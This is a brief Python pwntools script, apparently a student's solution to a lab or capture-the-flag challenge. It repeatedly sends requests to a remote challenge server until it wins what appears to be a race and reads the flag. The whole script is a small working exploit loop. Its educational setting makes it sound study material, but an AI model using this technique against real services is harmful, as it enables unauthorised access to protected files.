from pwn import *

connection = remote('up.zoolab.org', 10931)
# connection = process(['./cha_1', '/home/zjinghan/lab5/cha_1_folder'], shell=False)

while True:
    connection.sendline(b'R')
    connection.sendline(b'flag')
    reply = connection.recvline()
    if (reply[:7] == b'F> FLAG'):
        print(reply)
        break
